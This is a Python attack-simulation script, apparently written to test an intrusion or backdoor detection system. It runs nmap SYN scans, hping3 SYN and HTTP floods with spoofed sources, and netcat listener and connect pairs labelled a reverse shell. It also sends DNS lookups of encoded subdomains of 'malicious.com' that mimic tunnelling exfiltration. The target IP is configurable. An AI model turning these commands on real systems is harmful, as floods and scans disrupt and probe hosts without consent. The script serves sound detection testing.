#!/usr/bin/env python3
"""
Attack Simulation and Testing Suite
Simulates various attack types to test detection accuracy
"""
import os
import sys
import time
import json
import argparse
import subprocess
from datetime import datetime
from typing import List, Dict

class AttackSimulator:
    def __init__(self, target_ip, interface='lo'):
        self.target_ip = target_ip
        self.interface = interface
        self.attacks_performed = []
        
    def log_attack(self, attack_type, command, timestamp, success=True):
        """Log attack details"""
        self.attacks_performed.append({
            'attack_type': attack_type,
            'command': command,
            'timestamp': timestamp,
            'target': self.target_ip,
            'success': success
        })
    
    def port_scan(self):
        """Simulate port scanning attack"""
        print("[ATTACK] Port Scan")
        timestamp = datetime.now().isoformat()
        
        try:
            cmd = f"nmap -sS -p 1-1000 {self.target_ip}"
            print(f"  Command: {cmd}")
            
            result = subprocess.run(
                cmd.split(),
                capture_output=True,
                timeout=60
            )
            
            self.log_attack('port_scan', cmd, timestamp, result.returncode == 0)
            print("  [✓] Port scan completed")
            
        except Exception as e:
            print(f"  [!] Error: {e}")
            self.log_attack('port_scan', cmd, timestamp, False)
    
    def syn_flood(self, duration=10):
        """Simulate SYN flood attack"""
        print("[ATTACK] SYN Flood")
        timestamp = datetime.now().isoformat()
        
        try:
            cmd = f"hping3 -S -p 80 --flood --rand-source {self.target_ip}"
            print(f"  Command: {cmd}")
            print(f"  Duration: {duration} seconds")
            
            proc = subprocess.Popen(
                cmd.split(),
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            time.sleep(duration)
            proc.terminate()
            
            self.log_attack('syn_flood', cmd, timestamp, True)
            print("  [✓] SYN flood completed")
            
        except Exception as e:
            print(f"  [!] Error: {e}")
            self.log_attack('syn_flood', cmd, timestamp, False)
    
    def reverse_shell_simulation(self):
        """Simulate reverse shell connection (safe - localhost only)"""
        print("[ATTACK] Reverse Shell Simulation")
        timestamp = datetime.now().isoformat()
        
        try:
            # Start listener
            listener_cmd = "nc -lvp 4444"
            print(f"  Listener: {listener_cmd}")
            
            listener = subprocess.Popen(
                listener_cmd.split(),
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            time.sleep(2)
            
            # Simulate connection
            connect_cmd = f"nc {self.target_ip} 4444"
            print(f"  Connect: {connect_cmd}")
            
            connector = subprocess.Popen(
                connect_cmd.split(),
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            time.sleep(5)
            
            # Cleanup
            connector.terminate()
            listener.terminate()
            
            self.log_attack('reverse_shell', connect_cmd, timestamp, True)
            print("  [✓] Reverse shell simulation completed")
            
        except Exception as e:
            print(f"  [!] Error: {e}")
            self.log_attack('reverse_shell', 'nc simulation', timestamp, False)
    
    def dns_tunneling_simulation(self):
        """Simulate DNS tunneling patterns"""
        print("[ATTACK] DNS Tunneling Simulation")
        timestamp = datetime.now().isoformat()
        
        try:
            # Generate suspicious DNS queries
            suspicious_domains = [
                "aGVsbG8ud29ybGQ.malicious.com",
                "ZGF0YS5leGZpbA.malicious.com",
                "c2VjcmV0LmRhdGE.malicious.com"
            ]
            
            for domain in suspicious_domains:
                cmd = f"nslookup {domain}"
                subprocess.run(
                    cmd.split(),
                    capture_output=True,
                    timeout=5
                )
                time.sleep(1)
            
            self.log_attack('dns_tunneling', f'nslookup {len(suspicious_domains)} domains', timestamp, True)
            print("  [✓] DNS tunneling simulation completed")
            
        except Exception as e:
            print(f"  [!] Error: {e}")
            self.log_attack('dns_tunneling', 'nslookup simulation', timestamp, False)
    
    def http_flood(self, duration=10):
        """Simulate HTTP flood attack"""
        print("[ATTACK] HTTP Flood")
        timestamp = datetime.now().isoformat()
        
        try:
            cmd = f"hping3 -p 80 --flood {self.target_ip}"
            print(f"  Command: {cmd}")
            print(f"  Duration: {duration} seconds")
            
            proc = subprocess.Popen(
                cmd.split(),
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            time.sleep(duration)
            proc.terminate()
            
            self.log_attack('http_flood', cmd, timestamp, True)
            print("  [✓] HTTP flood completed")
            
        except Exception as e:
            print(f"  [!] Error: {e}")
            self.log_attack('http_flood', cmd, timestamp, False)
    
    def suspicious_process_behavior(self):
        """Simulate suspicious process behavior for host-based detection"""
        print("[ATTACK] Suspicious Process Behavior")
        timestamp = datetime.now().isoformat()
        
        try:
            # Spawn multiple processes with high resource usage
            processes = []
            
            for i in range(5):
                # CPU-intensive process
                proc = subprocess.Popen(
                    ['python3', '-c', 'while True: pass'],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                processes.append(proc)
            
            print(f"  Spawned {len(processes)} CPU-intensive processes")
            time.sleep(10)
            
            # Cleanup
            for proc in processes:
                proc.terminate()
            
            self.log_attack('suspicious_process', f'{len(processes)} CPU-intensive processes', timestamp, True)
            print("  [✓] Suspicious process simulation completed")
            
        except Exception as e:
            print(f"  [!] Error: {e}")
            self.log_attack('suspicious_process', 'process simulation', timestamp, False)
    
    def run_all_attacks(self, delay=5):
        """Run all attack simulations with delays"""
        print("=" * 60)
        print("ATTACK SIMULATION SUITE")
        print("=" * 60)
        print(f"Target: {self.target_ip}")
        print(f"Delay between attacks: {delay} seconds")
        print("=" * 60)
        
        attacks = [
            ('Port Scan', self.port_scan),
            ('SYN Flood', lambda: self.syn_flood(10)),
            ('Reverse Shell', self.reverse_shell_simulation),
            ('DNS Tunneling', self.dns_tunneling_simulation),
            ('HTTP Flood', lambda: self.http_flood(10)),
            ('Suspicious Process', self.suspicious_process_behavior)
        ]
        
        for i, (name, attack_func) in enumerate(attacks, 1):
            print(f"\n[{i}/{len(attacks)}] Running: {name}")
            print("-" * 60)
            
            try:
                attack_func()
            except Exception as e:
                print(f"  [ERROR] {e}")
            
            if i < len(attacks):
                print(f"\n  Waiting {delay} seconds before next attack...")
                time.sleep(delay)
        
        print("\n" + "=" * 60)
        print("ATTACK SIMULATION COMPLETE")
        print("=" * 60)
        print(f"Total attacks performed: {len(self.attacks_performed)}")
        print(f"Successful: {sum(1 for a in self.attacks_performed if a['success'])}")
        print(f"Failed: {sum(1 for a in self.attacks_performed if not a['success'])}")
    
    def save_attack_log(self, output_file):
        """Save attack log to JSON file"""
        with open(output_file, 'w') as f:
            json.dump({
                'attacks': self.attacks_performed,
                'summary': {
                    'total': len(self.attacks_performed),
                    'successful': sum(1 for a in self.attacks_performed if a['success']),
                    'failed': sum(1 for a in self.attacks_performed if not a['success'])
                }
            }, f, indent=2)
        
        print(f"\n[✓] Attack log saved to: {output_file}")

def main():
    parser = argparse.ArgumentParser(description='Attack simulation and testing suite')
    parser.add_argument('--target', default='127.0.0.1', help='Target IP address')
    parser.add_argument('--interface', default='lo', help='Network interface')
    parser.add_argument('--mode', choices=['test', 'single'], default='test',
                       help='Run all attacks (test) or single attack (single)')
    parser.add_argument('--attack', choices=['port_scan', 'syn_flood', 'reverse_shell',
                                             'dns_tunneling', 'http_flood', 'suspicious_process'],
                       help='Single attack to run (requires --mode single)')
    parser.add_argument('--duration', type=int, default=10,
                       help='Duration for flood attacks (seconds)')
    parser.add_argument('--delay', type=int, default=5,
                       help='Delay between attacks in test mode (seconds)')
    parser.add_argument('--output', default='attacks_performed.json',
                       help='Output file for attack log')
    
    args = parser.parse_args()
    
    # Check if running as root (required for some attacks)
    if os.geteuid() != 0:
        print("[WARNING] Some attacks require root privileges (sudo)")
        print("[WARNING] Running without sudo may cause some attacks to fail")
        response = input("Continue anyway? (y/n): ")
        if response.lower() != 'y':
            sys.exit(0)
    
    # Create simulator
    simulator = AttackSimulator(args.target, args.interface)
    
    # Run attacks
    if args.mode == 'test':
        simulator.run_all_attacks(args.delay)
    else:
        if not args.attack:
            print("[ERROR] --attack required when using --mode single")
            sys.exit(1)
        
        attack_map = {
            'port_scan': simulator.port_scan,
            'syn_flood': lambda: simulator.syn_flood(args.duration),
            'reverse_shell': simulator.reverse_shell_simulation,
            'dns_tunneling': simulator.dns_tunneling_simulation,
            'http_flood': lambda: simulator.http_flood(args.duration),
            'suspicious_process': simulator.suspicious_process_behavior
        }
        
        print(f"Running single attack: {args.attack}")
        attack_map[args.attack]()
    
    # Save log
    simulator.save_attack_log(args.output)
    
    print("\n" + "=" * 60)
    print("NEXT STEPS")
    print("=" * 60)
    print("1. Check detection logs:")
    print("   tail -f /var/log/backdoor-detection/hybrid_live.log")
    print("\n2. Measure accuracy:")
    print(f"   python3 scripts/measure_accuracy.py --attack-log {args.output}")
    print("\n3. Review false positives/negatives")
    print("=" * 60)

if __name__ == '__main__':
    main()
